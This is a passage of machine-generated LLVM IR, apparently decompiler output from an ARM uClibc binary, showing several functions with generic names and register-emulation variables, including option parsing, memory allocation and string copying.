  %v0_8e30 = phi i32 [ %v2_8e40, %dec_label_pc_8e30.dec_label_pc_8e30_crit_edge ], [ %v2_8e20, %bb7 ]
  %v1_8e30 = add i32 %v0_8e30, 4
  %v2_8e34 = inttoptr i32 %v1_8e34 to i32*
  store i32 %v1_8e30, i32* %v2_8e34, align 4
  %v0_8e3c = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_8e3c)
  %v2_8e40 = load i32, i32* bitcast (i32** @global_var_1ccf8.61 to i32*), align 4
  store i32 %v2_8e40, i32* %r2.global-to-local, align 4
  %v2_8e48 = icmp eq i32 %v2_8e40, 0
  br i1 %v2_8e48, label %.loopexit, label %dec_label_pc_8e30.dec_label_pc_8e30_crit_edge

dec_label_pc_8e30.dec_label_pc_8e30_crit_edge:    ; preds = %dec_label_pc_8e30
  %v1_8e34.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8e30

.loopexit:                                        ; preds = %dec_label_pc_8e30
  %v2_8e68.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8e68 = phi i32 [ %v2_8e68.pre, %.loopexit ], [ ptrtoint (i8** @global_var_1cd14.58 to i32), %bb7 ]
  %v3_8e68 = inttoptr i32 %v2_8e68 to i8*
  store i8 1, i8* %v3_8e68, align 1
  %v2_8e6c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8e6c, i32* %r4.global-to-local, align 4
  %v11_8e6c = load i32, i32* @r0, align 4
  ret i32 %v11_8e6c

; uselistorder directives
  uselistorder i32 %v2_8e40, { 1, 2, 0 }
  uselistorder i32** @global_var_1ccf8.61, { 1, 0 }
  uselistorder i8** @global_var_1cd14.58, { 1, 0 }
  uselistorder label %dec_label_pc_8e30, { 1, 0 }
}

define i32 @function_8e7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_8e7c:
  %v0_8e7c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8e7c, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_8e7c
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_8e7c, %bb
  %v5_8e84 = load i32, i32* @r0, align 4
  ret i32 %v5_8e84

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_8e88() local_unnamed_addr {
.thread:
  %v2_8ea8 = load i32, i32* inttoptr (i32 117624 to i32*), align 8
  %v2_8eac = icmp eq i32 %v2_8ea8, 0
  br i1 %v2_8eac, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 117624

bb2:                                              ; preds = %.thread
  ret i32 117624

; uselistorder directives
  uselistorder i32 117624, { 1, 0, 2 }
}

define i32 @function_8ee0() local_unnamed_addr {
dec_label_pc_8ee0:
  %v5_8ee4 = load i32, i32* @r0, align 4
  ret i32 %v5_8ee4
}

; Function Attrs: noreturn
define i32 @__start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8ef0 = ptrtoint i32* %stack_var_4 to i32
  %v7_8f10 = call i32 @___uClibc_main(i32 ptrtoint (i32* @global_var_101d8.73 to i32), i32 %arg2, i32 %v4_8ef0, i32 35692, i32 82708, i32 %arg1, i32 %v4_8ef0)
  call void @abort()
  unreachable

; uselistorder directives
  uselistorder void ()* @abort, { 0, 2, 1 }
}

define i32 @function_8f24(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8f24:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sp.global-to-local = alloca i32, align 4
  store i32 0, i32* %sp.global-to-local, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %tmp184 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-10568 = alloca i32, align 4
  %stack_var_-404 = alloca i32, align 4
  %stack_var_-20809 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_8f24 = load i32, i32* @r4, align 4
  store i32 %v3_8f24, i32* %stack_var_-36, align 4
  %v6_8f24 = load i32, i32* @r5, align 4
  %v9_8f24 = load i32, i32* @r6, align 4
  %v15_8f24 = load i32, i32* @r8, align 4
  %v18_8f24 = load i32, i32* @sb, align 4
  %v24_8f24 = load i32, i32* @fp, align 4
  %v1_8f30 = urem i32 %arg3, 256
  store i32 %v1_8f30, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_8f3c = urem i32 %arg1, 256
  store i32 %v1_8f3c, i32* %ip.global-to-local, align 4
  store i32 21, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v1_8f30, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v5_8f58 = inttoptr i32 %arg4 to i32*
  %v6_8f58 = call i32 @function_acdc(i32 %v1_8f30, i32* %v5_8f58, i32 21, i32 0, i32 %arg2)
  %v0_8f5c = load i32, i32* @r5, align 4
  store i32 %v0_8f5c, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v0_8f68 = load i32, i32* @r4, align 4
  store i32 %v0_8f68, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_14368.76 to i32), i32* %r3.global-to-local, align 4
  %v6_8f70 = inttoptr i32 %v0_8f5c to i32*
  %v7_8f70 = call i32 @function_acdc(i32 %v0_8f68, i32* %v6_8f70, i32 20, i32 ptrtoint ([4 x i8]* @global_var_14368.76 to i32), i32 %v6_8f58)
  %v0_8f74 = load i32, i32* @r5, align 4
  store i32 %v0_8f74, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v7_8f70, i32* %fp.global-to-local, align 4
  %v0_8f84 = load i32, i32* @r4, align 4
  store i32 %v0_8f84, i32* %r0.global-to-local, align 4
  %v5_8f88 = inttoptr i32 %v0_8f74 to i32*
  %v6_8f88 = call i32 @function_acdc(i32 %v0_8f84, i32* %v5_8f88, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v0_8f8c = load i32, i32* @r5, align 4
  store i32 %v0_8f8c, i32* %r1.global-to-local, align 4
  store i32 %v6_8f88, i32* %sb.global-to-local, align 4
  store i32 22, i32* %r2.global-to-local, align 4
  %v0_8f98 = load i32, i32* @r4, align 4
  store i32 %v0_8f98, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_1436c.78 to i32), i32* %r3.global-to-local, align 4
  %v6_8fa0 = inttoptr i32 %v0_8f8c to i32*
  %v7_8fa0 = call i32 @function_acdc(i32 %v0_8f98, i32* %v6_8fa0, i32 22, i32 ptrtoint ([2 x i8]* @global_var_1436c.78 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8fa4 = load i32, i32* @r5, align 4
  store i32 %v0_8fa4, i32* %r1.global-to-local, align 4
  store i32 %v7_8fa0, i32* @sl, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_8fb0 = load i32, i32* @r4, align 4
  store i32 %v0_8fb0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_8fb8 = inttoptr i32 %v0_8fa4 to i32*
  %v5_8fb8 = call i32 @function_b240(i32 %v0_8fb0, i32* %v4_8fb8, i32 24, i32 1)
  %v0_8fbc = load i32, i32* @r5, align 4
  store i32 %v0_8fbc, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 %v5_8fb8, i32* @r6, align 4
  %v0_8fcc = load i32, i32* @r4, align 4
  store i32 %v0_8fcc, i32* %r0.global-to-local, align 4
  %v4_8fd0 = inttoptr i32 %v0_8fbc to i32*
  %v5_8fd0 = call i32 @function_b240(i32 %v0_8fcc, i32* %v4_8fd0, i32 7, i32 80)
  %v2_8fd8 = ptrtoint i32* %stack_var_-20809 to i32
  %v3_8fe0 = mul i32 %v5_8fd0, 65536
  store i32 %v3_8fe0, i32* %r3.global-to-local, align 4
  %tmp197 = bitcast i32* %stack_var_-20809 to i8*
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  store i32 10241, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8ff4 = urem i32 %v5_8fd0, 65536
  store i32 %v3_8ff4, i32* %r8.global-to-local, align 4
  %v4_8ff8 = call i32* @memset(i32* nonnull %stack_var_-20809, i32 0, i32 10241)
  %v6_8ff8 = ptrtoint i32* %v4_8ff8 to i32
  store i32 %v6_8ff8, i32* %r0.global-to-local, align 4
  %v0_8ffc = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_8ffc = icmp slt i32 %v0_8ffc, 0
  store i1 %v1_8ffc, i1* %cpsr_n.global-to-local, align 1
  %v2_8ffc = icmp eq i32 %v0_8ffc, 0
  store i1 %v2_8ffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8ffc, label %.thread11, label %bb

bb:                                               ; preds = %dec_label_pc_8f24
  %v1_9000 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_9000 = icmp slt i32 %v1_9000, 0
  store i1 %v2_9000, i1* %cpsr_n.global-to-local, align 1
  %v3_9000 = icmp eq i32 %v1_9000, 0
  store i1 %v3_9000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9000, label %bb198, label %dec_label_pc_901c

.thread11:                                        ; preds = %dec_label_pc_8f24
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9010

bb198:                                            ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9010

dec_label_pc_9010:                                ; preds = %bb198, %dec_label_pc_903c, %.thread11, %dec_label_pc_902c, %dec_label_pc_901c
  %v29_9018 = phi i32 [ %v2_9040, %dec_label_pc_903c ], [ %v6_8ff8, %.thread11 ], [ %v6_8ff8, %bb198 ], [ %v2_9030, %dec_label_pc_902c ], [ %v2_9020, %dec_label_pc_901c ]
  %v2_9018 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_9018, i32* %r4.global-to-local, align 4
  store i32 %v6_8f24, i32* %r5.global-to-local, align 4
  store i32 %v9_8f24, i32* %r6.global-to-local, align 4
  store i32 %v15_8f24, i32* %r8.global-to-local, align 4
  store i32 %v18_8f24, i32* %sb.global-to-local, align 4
  store i32 %v24_8f24, i32* %fp.global-to-local, align 4
  ret i32 %v29_9018

dec_label_pc_901c:                                ; preds = %bb
  store i32 0, i32* @r4, align 4
  store i32 %v0_8ffc, i32* %r0.global-to-local, align 4
  %v1_9020 = inttoptr i32 %v0_8ffc to i8*
  %v2_9020 = call i32 @function_13a08(i8* %v1_9020)
  store i32 %v2_9020, i32* %r0.global-to-local, align 4
  %v1_9024 = add i32 %v2_9020, -255
  %v2_9024 = icmp ugt i32 %v2_9020, 254
  store i1 %v2_9024, i1* %cpsr_c.global-to-local, align 1
  %v3_9024 = sub i32 254, %v2_9020
  %v4_9024 = and i32 %v3_9024, %v2_9020
  %v5_9024 = icmp slt i32 %v4_9024, 0
  store i1 %v5_9024, i1* %cpsr_v.global-to-local, align 1
  %v6_9024 = icmp slt i32 %v1_9024, 0
  store i1 %v6_9024, i1* %cpsr_n.global-to-local, align 1
  %v7_9024 = icmp eq i32 %v2_9020, 255
  store i1 %v7_9024, i1* %cpsr_z.global-to-local, align 1
  %v8_9028 = icmp sgt i32 %v2_9020, 255
  br i1 %v8_9028, label %dec_label_pc_9010, label %dec_label_pc_902c

dec_label_pc_902c:                                ; preds = %dec_label_pc_901c
  %v0_902c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_902c, i32* %r0.global-to-local, align 4
  %v1_9030 = inttoptr i32 %v0_902c to i8*
  %v2_9030 = call i32 @function_13a08(i8* %v1_9030)
  store i32 %v2_9030, i32* %r0.global-to-local, align 4
  %v1_9034 = add i32 %v2_9030, -127
  %v2_9034 = icmp ugt i32 %v2_9030, 126
  store i1 %v2_9034, i1* %cpsr_c.global-to-local, align 1
  %v3_9034 = sub i32 126, %v2_9030
  %v4_9034 = and i32 %v3_9034, %v2_9030
  %v5_9034 = icmp slt i32 %v4_9034, 0
  store i1 %v5_9034, i1* %cpsr_v.global-to-local, align 1
  %v6_9034 = icmp slt i32 %v1_9034, 0
  store i1 %v6_9034, i1* %cpsr_n.global-to-local, align 1
  %v7_9034 = icmp eq i32 %v2_9030, 127
  store i1 %v7_9034, i1* %cpsr_z.global-to-local, align 1
  %v8_9038 = icmp sgt i32 %v2_9030, 127
  br i1 %v8_9038, label %dec_label_pc_9010, label %dec_label_pc_903c

dec_label_pc_903c:                                ; preds = %dec_label_pc_902c
  %v0_903c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_903c, i32* %r0.global-to-local, align 4
  %v1_9040 = inttoptr i32 %v0_903c to i8*
  %v2_9040 = call i32 @function_13a08(i8* %v1_9040)
  store i32 %v2_9040, i32* %r0.global-to-local, align 4
  %v1_9044 = add i32 %v2_9040, -9
  %v2_9044 = icmp ugt i32 %v2_9040, 8
  store i1 %v2_9044, i1* %cpsr_c.global-to-local, align 1
  %v3_9044 = sub i32 8, %v2_9040
  %v4_9044 = and i32 %v3_9044, %v2_9040
  %v5_9044 = icmp slt i32 %v4_9044, 0
  store i1 %v5_9044, i1* %cpsr_v.global-to-local, align 1
  %v6_9044 = icmp slt i32 %v1_9044, 0
  store i1 %v6_9044, i1* %cpsr_n.global-to-local, align 1
  %v7_9044 = icmp eq i32 %v2_9040, 9
  store i1 %v7_9044, i1* %cpsr_z.global-to-local, align 1
  %v7_9048 = icmp sgt i32 %v2_9040, 9
  br i1 %v7_9048, label %dec_label_pc_9010, label %bb199

bb199:                                            ; preds = %dec_label_pc_903c
  %v10_9048 = ptrtoint i32* %stack_var_-404 to i32
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v8_904c = load i32, i32* @r4, align 4
  %v10_904c = add i32 %v10_9048, 364
  %v11_904c = inttoptr i32 %v10_904c to i32*
  store i32 %v8_904c, i32* %v11_904c, align 4
  br label %dec_label_pc_9054

dec_label_pc_9054:                                ; preds = %bb199, %bb203
  %v7_907c = phi i32 [ %tmp184, %bb199 ], [ %v1_908c, %bb203 ]
  %v0_9054 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9054, i32* %r0.global-to-local, align 4
  %v1_9058 = inttoptr i32 %v0_9054 to i8*
  %v2_9058 = call i32 @function_13a08(i8* %v1_9058)
  store i32 %v2_9058, i32* %r0.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  store i32 %v7_907c, i32* %ip.global-to-local, align 4
  %v2_9064 = sub i32 %v2_9058, %v7_907c
  %v3_9064 = icmp uge i32 %v2_9058, %v7_907c
  store i1 %v3_9064, i1* %cpsr_c.global-to-local, align 1
  %v4_9064 = xor i32 %v2_9058, %v7_907c
  %v5_9064 = xor i32 %v2_9064, %v2_9058
  %v6_9064 = and i32 %v5_9064, %v4_9064
  %v7_9064 = icmp slt i32 %v6_9064, 0
  store i1 %v7_9064, i1* %cpsr_v.global-to-local, align 1
  %v8_9064 = icmp slt i32 %v2_9064, 0
  store i1 %v8_9064, i1* %cpsr_n.global-to-local, align 1
  %v9_9064 = icmp eq i32 %v2_9058, %v7_907c
  store i1 %v9_9064, i1* %cpsr_z.global-to-local, align 1
  %v7_9068 = icmp sgt i32 %v2_9058, %v7_907c
  br i1 %v7_9068, label %dec_label_pc_906c, label %dec_label_pc_9098

dec_label_pc_906c:                                ; preds = %dec_label_pc_9054
  %v0_906c = load i32, i32* %fp.global-to-local, align 4
  %v2_906c = add i32 %v0_906c, %v7_907c
  %v3_906c = inttoptr i32 %v2_906c to i8*
  %v4_906c = load i8, i8* %v3_906c, align 1
  %v6_906c = zext i8 %v4_906c to i32
  %v1_9070 = add nsw i32 %v6_906c, -32
  store i32 %v1_9070, i32* %r2.global-to-local, align 4
  %v1_9074 = add nsw i32 %v6_906c, -97
  store i32 %v1_9074, i32* %r3.global-to-local, align 4
  %v2_9078 = icmp ugt i32 %v1_9074, 24
  store i1 %v2_9078, i1* %cpsr_c.global-to-local, align 1
  %v3_9078 = sub nsw i32 121, %v6_906c
  %v4_9078 = and i32 %v3_9078, %v1_9074
  %v5_9078 = icmp slt i32 %v4_9078, 0
  store i1 %v5_9078, i1* %cpsr_v.global-to-local, align 1
  %v6_9078 = icmp ult i8 %v4_906c, 122
  store i1 %v6_9078, i1* %cpsr_n.global-to-local, align 1
  %v7_9078 = icmp eq i32 %v1_9074, 25
  store i1 %v7_9078, i1* %cpsr_z.global-to-local, align 1
  %v2_907c = xor i1 %v2_9078, true
  %v3_907c = or i1 %v7_9078, %v2_907c
  br i1 %v3_907c, label %bb200, label %bb201

bb200:                                            ; preds = %dec_label_pc_906c
  %v5_907c = trunc i32 %v1_9070 to i8
  store i8 %v5_907c, i8* %v3_906c, align 1
  %v0_9080.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_9080.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb201

bb201:                                            ; preds = %dec_label_pc_906c, %bb200
  %v1_9084 = phi i1 [ %v2_9078, %dec_label_pc_906c ], [ %v1_9080.pre, %bb200 ]
  %v0_9084 = phi i1 [ false, %dec_label_pc_906c ], [ %v0_9080.pre, %bb200 ]
  %v2_9080 = xor i1 %v1_9084, true
  %v3_9080 = or i1 %v0_9084, %v2_9080
  br i1 %v3_9080, label %bb202, label %._crit_edge

._crit_edge:                                      ; preds = %bb201
  %v0_908c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb203

bb202:                                            ; preds = %bb201
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  %v7_9084 = load i32, i32* %v11_904c, align 4
  store i32 %v7_9084, i32* %ip.global-to-local, align 4
  br label %bb203

bb203:                                            ; preds = %._crit_edge, %bb202
  %v0_908c = phi i32 [ %v0_908c.pre, %._crit_edge ], [ %v7_9084, %bb202 ]
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v1_908c = add i32 %v0_908c, 1
  store i32 %v1_908c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9054

dec_label_pc_9098:                                ; preds = %dec_label_pc_9054
  store i32 36, i32* %r0.global-to-local, align 4
  %v1_909c = call i32 @function_130e4(i32 36)
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_90a4 = call i32 @function_130e4(i32 37)
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_90ac = call i32 @function_130e4(i32 38)
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_90b4 = call i32 @function_130e4(i32 39)
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_90bc = call i32 @function_130e4(i32 40)
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_90c4 = call i32 @function_130e4(i32 41)
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_90cc = call i32 @function_130e4(i32 42)
  store i32 43, i32* %r0.global-to-local, align 4
  %v1_90d4 = call i32 @function_130e4(i32 43)
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_90dc = call i32 @function_130e4(i32 44)
  store i32 45, i32* %r0.global-to-local, align 4
  %v1_90e4 = call i32 @function_130e4(i32 45)
  store i32 %v1_90e4, i32* %r0.global-to-local, align 4
  %v0_90e8 = load i32, i32* @r6, align 4
  %v2_90e8 = add i32 %v0_90e8, -256
  %v3_90e8 = icmp ugt i32 %v0_90e8, 255
  store i1 %v3_90e8, i1* %cpsr_c.global-to-local, align 1
  %v4_90e8 = sub i32 255, %v0_90e8
  %v5_90e8 = and i32 %v4_90e8, %v0_90e8
  %v6_90e8 = icmp slt i32 %v5_90e8, 0
  store i1 %v6_90e8, i1* %cpsr_v.global-to-local, align 1
  %v7_90e8 = icmp slt i32 %v2_90e8, 0
  store i1 %v7_90e8, i1* %cpsr_n.global-to-local, align 1
  %v8_90e8 = icmp eq i32 %v0_90e8, 256
  store i1 %v8_90e8, i1* %cpsr_z.global-to-local, align 1
  %v5_90ec = icmp slt i32 %v0_90e8, 256
  br i1 %v5_90ec, label %thread-pre-split, label %bb204

bb204:                                            ; preds = %dec_label_pc_9098
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_9098, %bb204
  %v0_90f4 = phi i32 [ 256, %bb204 ], [ %v0_90e8, %dec_label_pc_9098 ]
  store i32 46, i32* %r0.global-to-local, align 4
  %v1_90f8 = call i32 @function_130e4(i32 46)
  store i32 %v0_90f4, i32* %r0.global-to-local, align 4
  store i32 3140, i32* %r1.global-to-local, align 4
  %v2_9108 = call i32* @calloc(i32 %v0_90f4, i32 3140)
  %v3_9108 = ptrtoint i32* %v2_9108 to i32
  store i32 %v3_9108, i32* %r0.global-to-local, align 4
  store i32 %v0_90f4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9110 = icmp slt i32 %v0_90f4, 0
  store i1 %v1_9110, i1* %cpsr_n.global-to-local, align 1
  %v2_9110 = icmp eq i32 %v0_90f4, 0
  store i1 %v2_9110, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9108, i32* @r5, align 4
  %tmp205 = icmp slt i32 %v0_90f4, 1
  br i1 %tmp205, label %dec_label_pc_924c, label %dec_label_pc_9120

dec_label_pc_9120:                                ; preds = %thread-pre-split
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_9124

dec_label_pc_9124:                                ; preds = %dec_label_pc_abc8, %dec_label_pc_9120
  %v1_9130 = phi i32 [ %v1_abe4, %dec_label_pc_abc8 ], [ %v3_9108, %dec_label_pc_9120 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %v1_8f3c, i32* %r1.global-to-local, align 4
  %v2_9130 = inttoptr i32 %v1_9130 to i32*
  store i32 -1, i32* %v2_9130, align 4
  %v0_9134 = load i32, i32* %r3.global-to-local, align 4
  %v1_9134 = trunc i32 %v0_9134 to i8
  %v2_9134 = load i32, i32* @r5, align 4
  %v3_9134 = add i32 %v2_9134, 4
  %v4_9134 = inttoptr i32 %v3_9134 to i8*
  store i8 %v1_9134, i8* %v4_9134, align 1
  %v0_9138 = load i32, i32* @r7, align 4
  %v1_913c = load i32, i32* %r1.global-to-local, align 4
  %v2_913c = srem i32 %v0_9138, %v1_913c
  store i32 %v2_913c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v2_9148 = and i32 %v2_913c, 536870912
  %v3_9148 = icmp ne i32 %v2_9148, 0
  store i1 %v3_9148, i1* %cpsr_c.global-to-local, align 1
  %v5_9148 = mul i32 %v2_913c, 24
  store i32 %v5_9148, i32* %r3.global-to-local, align 4
  %v2_914c = add i32 %v5_9148, %arg2
  store i32 %v2_914c, i32* @r6, align 4
  %v1_9150 = add i32 %v2_914c, 16
  %v2_9150 = inttoptr i32 %v1_9150 to i32*
  %v3_9150 = load i32, i32* %v2_9150, align 4
  store i32 %v3_9150, i32* %r2.global-to-local, align 4
  %v0_9154 = load i32, i32* @r5, align 4
  %v1_9154 = add i32 %v0_9154, 532
  store i32 %v1_9154, i32* %lr.global-to-local, align 4
  store i32 %v1_9154, i32* @r0, align 4
  %v0_915c = load i32, i32* @sl, align 4
  store i32 %v0_915c, i32* %r1.global-to-local, align 4
  %v2_9160 = add i32 %v0_9154, 16
  %v3_9160 = inttoptr i32 %v2_9160 to i32*
  store i32 %v3_9150, i32* %v3_9160, align 4
  %v0_9164 = load i32, i32* %lr.global-to-local, align 4
  %v2_9168 = inttoptr i32 %v1_9154 to i8*
  %v3_9168 = call i32 @function_13a30(i8* %v2_9168, i32 %v0_915c)
  store i32 %v3_9168, i32* %r0.global-to-local, align 4
  %v0_916c = load i32, i32* @r5, align 4
  %v1_916c = add i32 %v0_916c, 532
  %v2_916c = inttoptr i32 %v1_916c to i8*
  %v3_916c = load i8, i8* %v2_916c, align 1
  %v4_916c = zext i8 %v3_916c to i32
  store i32 %v4_916c, i32* %r3.global-to-local, align 4
  %v2_9170 = icmp ugt i8 %v3_916c, 46
  store i1 %v2_9170, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9170 = icmp ult i8 %v3_916c, 47
  store i1 %v6_9170, i1* %cpsr_n.global-to-local, align 1
  %v7_9170 = icmp eq i8 %v3_916c, 47
  store i1 %v7_9170, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9170, label %dec_label_pc_919c, label %dec_label_pc_9178

dec_label_pc_9178:                                ; preds = %dec_label_pc_9124
  store i32 %v0_9164, i32* %r0.global-to-local, align 4
  %v1_917c = inttoptr i32 %v0_9164 to i8*
  %v2_917c = call i32 @function_13a08(i8* %v1_917c)
  store i32 %v2_917c, i32* %r2.global-to-local, align 4
  %v0_9184 = load i32, i32* @r5, align 4
  %v1_9188 = add i32 %v0_9184, 533
  store i32 %v1_9188, i32* %r0.global-to-local, align 4
  store i32 %v0_9164, i32* %r1.global-to-local, align 4
  %v3_9190 = call i32 @_memmove(i32 %v1_9188, i32 %v0_9164, i32 %v2_917c)
  store i32 %v3_9190, i32* %r0.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_9198 = load i32, i32* @r5, align 4
  %v3_9198 = add i32 %v2_9198, 532
  %v4_9198 = inttoptr i32 %v3_9198 to i8*
  store i8 47, i8* %v4_9198, align 1
  %v0_91a0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_919c

dec_label_pc_919c:                                ; preds = %dec_label_pc_9124, %dec_label_pc_9178
  %v0_91a0 = phi i32 [ %v0_916c, %dec_label_pc_9124 ], [ %v0_91a0.pre, %dec_label_pc_9178 ]
  %v0_919c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_919c, i32* %r1.global-to-local, align 4
  %v1_91a0 = add i32 %v0_91a0, 1440
  store i32 %v1_91a0, i32* @r0, align 4
  %v2_91a4 = inttoptr i32 %v1_91a0 to i8*
  %v3_91a4 = call i32 @function_13a30(i8* %v2_91a4, i32 %v0_919c)
  %v0_91a8 = load i32, i32* @r5, align 4
  %v0_91ac = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_91ac, i32* %r1.global-to-local, align 4
  %v1_91b0 = add i32 %v0_91a8, 1431
  store i32 %v1_91b0, i32* @r0, align 4
  %v2_91b4 = inttoptr i32 %v1_91b0 to i8*
  %v3_91b4 = call i32 @function_13a30(i8* %v2_91b4, i32 %v0_91ac)
  %v0_91b8 = load i32, i32* @r5, align 4
  %v1_91bc = add i32 %v0_91b8, 789
  store i32 %v1_91bc, i32* @r0, align 4
  %v0_91c0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_91c0, i32* %r1.global-to-local, align 4
  %v2_91c4 = inttoptr i32 %v1_91bc to i8*
  %v3_91c4 = call i32 @function_13a30(i8* %v2_91c4, i32 %v0_91c0)
  store i32 %v3_91c4, i32* %r0.global-to-local, align 4
  %v0_91c8 = load i32, i32* @r6, align 4
  %v1_91c8 = add i32 %v0_91c8, 20
  %v2_91c8 = inttoptr i32 %v1_91c8 to i8*
  %v3_91c8 = load i8, i8* %v2_91c8, align 1
  %v4_91c8 = zext i8 %v3_91c8 to i32
  store i32 %v4_91c8, i32* %r3.global-to-local, align 4
  %v2_91cc = icmp ugt i8 %v3_91c8, 30
  store i1 %v2_91cc, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_91cc = icmp ult i8 %v3_91c8, 31
  store i1 %v6_91cc, i1* %cpsr_n.global-to-local, align 1
  %v7_91cc = icmp eq i8 %v3_91c8, 31
  store i1 %v7_91cc, i1* %cpsr_z.global-to-local, align 1
  %v2_91d0 = xor i1 %v7_91cc, true
  %v3_91d0 = and i1 %v2_91cc, %v2_91d0
  br i1 %v3_91d0, label %dec_label_pc_abc8, label %dec_label_pc_91d4

dec_label_pc_91d4:                                ; preds = %dec_label_pc_919c
  %v1_91d4 = add i32 %v0_91c8, 16
  %v2_91d4 = inttoptr i32 %v1_91d4 to i32*
  %v3_91d4 = load i32, i32* %v2_91d4, align 4
  store i32 %v3_91d4, i32* @r4, align 4
  %v0_91d8 = call i32 @function_10bd8()
  store i32 %v0_91d8, i32* %r0.global-to-local, align 4
  %v0_91dc = load i32, i32* @r4, align 4
